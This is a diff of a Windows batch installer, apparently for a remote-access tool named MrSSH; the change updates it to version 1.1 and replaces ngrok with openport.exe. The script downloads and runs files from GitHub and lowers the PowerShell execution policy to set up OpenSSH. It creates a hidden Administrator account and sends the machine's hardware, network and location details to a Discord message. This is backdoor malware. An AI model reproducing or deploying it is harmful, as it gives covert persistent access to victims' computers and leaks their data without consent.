@@ -1,15 +1,16 @@
 @echo on
 setlocal enabledelayedexpansion
 chcp 65001 >nul
+pushd %temp%
 
 :: <Variables>
 set "Token=%~1"
-set "JsonValues=token version CreationDate ID Endpoint Access Auth Auth2 Auth3"
-set "Version=1.0"
+set "JsonValues=token version CreationDate ID Endpoint Access"
+set "Version=1.1"
 set "DefaultToken=0000"
 set Files=PFaS.bat OpenSSH.ps1 hide.reg WebParse.exe
 set OnLogFiles=onlogon.bat Run.vbs MrSSH-task.xml
-set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
+set Github=https://github.com/dh3b/MrSSH/raw/v.1.1/Files/
 set "TaskFile=!Data!\MrSSH-task.xml"
 set "ErrorCount=0"
 set "StatusFile=!TFolder!\Status.ini"
@@ -26,17 +27,6 @@ pushd !Folder!
 
 :: <Processor architecture and windows check>
 for /f "delims=" %%a in ('wmic os get OSArchitecture ^| findstr bit') do set "Bits=%%a"
-if !Bits!=="64-bit" (
-   set "ngrok=ngrok64.exe"
-)
-if !Bits!=="32-bit" (
-   set "ngrok=ngrok32.exe"
-) else (
-   set "ngrok=ngrok64.exe"
-   echo WARNING: System bits undefined (!Bits!)>>!StatusFile!
-   echo.>>!StatusFile!
-   set !ErrorCount!+=1
-)
 for /f "delims=" %%a in ('systeminfo ^| findstr /B /C:"OS Name"') do set "Windows=%%a"
 set windows=%windows:~-25%
 :: </Processor architecture and windows check>
@@ -46,8 +36,7 @@ curl -fL#k "https://raw.githubusercontent.com/agamsol/Batch-Projects/main/Discor
 :: </Separate Install for discord msg>
 
 :: <Install>
-Rem download ngrok anyway, because it often bugs
-curl -fL#k "!Github!!ngrok!" -o "!PFaS!\ngrok.exe"
+curl -fL#k "!Github!openport.exe" -o "!PFaS!\openport.exe"
 
 Rem download files into !Files!
 for %%a in (%Files%) do if not exist "%Folder%\%%a" set /a MissingFiles+=1
@@ -75,7 +64,7 @@ if exist !StatusFile! del /Q !StatusFile!
 echo [Indicates if token exists either does not]>!StatusFile!
 if not defined Token set "Token=!DefaultToken!"
 if exist !TFolder!\bin\Token.json del /Q !TFolder!\bin\Token.json
-set "TokenURL=https://github.com/dh3b/MrSSH/raw/v.1.0/Identifiers/!Token!.json"
+set "TokenURL=https://github.com/dh3b/MrSSH/raw/v.1.1/Identifiers/!Token!.json"
 curl --create-dirs -Ls "!TokenURL!" -o "!TFolder!\bin\Token.json" & if !ErrorLevel! equ 1 (
    echo TokenStatus=Does not exist either the program did not specify it>>!StatusFile!
    echo.>>!StatusFile!
@@ -85,7 +74,7 @@ curl --create-dirs -Ls "!TokenURL!" -o "!TFolder!\bin\Token.json" & if !ErrorLev
    echo.>>!StatusFile!
 )
 for /f "delims=" %%t in ('call "WebParse.exe" "!TokenURL!" !JsonValues!') do set "Json.%%t"
-for %%a in (Endpoint Access Auth Auth2 Auth3 ID) do (
+for %%a in (Endpoint Access ID) do (
    call :Decode "!Json.%%a!"
    set "Json.%%a=!PlainString!"
 )
@@ -115,6 +104,7 @@ curl --create-dirs -Ls "!URL!/raw" -o "!TFolder!\bin\rentry.txt" & if !ErrorLeve
 )
 :: </Set token info>
 
+chcp 437 >nul
 powershell "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 powershell ./OpenSSH.ps1
 
@@ -184,6 +174,7 @@ if !ErrorLevel! neq 0 (
 )
 :: </Create Administrator account, hide it and set strong rndm password for it>
 
+
 :: <Get Network and Hardware>
 for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
 for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
@@ -205,7 +196,7 @@ set "ID=:key: __**Token Info**__\\n\\n:ticket: **Token:** %Token%\\n\\n:calendar
 
 call source.bat +silent --embed "!Title!" "!PcCnfg!\\n\\n\\n!Specs!\\n\\n\\n!LocationInfo!\\n\\n\\n!ID!\\n\\n\\n*Pssst... Wait a second, that isn't all. There are 2 more embeds waiting for them to send.*" "52bf90" "https://i.imgur.com/b2Terft.png"
 
-start /B "PFaS" call PFaS.bat !Json.Auth! !Json.Auth2! !Json.Auth3!
+start /B "PFaS" call PFaS.bat
 
 :: <Encode>
 :Encode
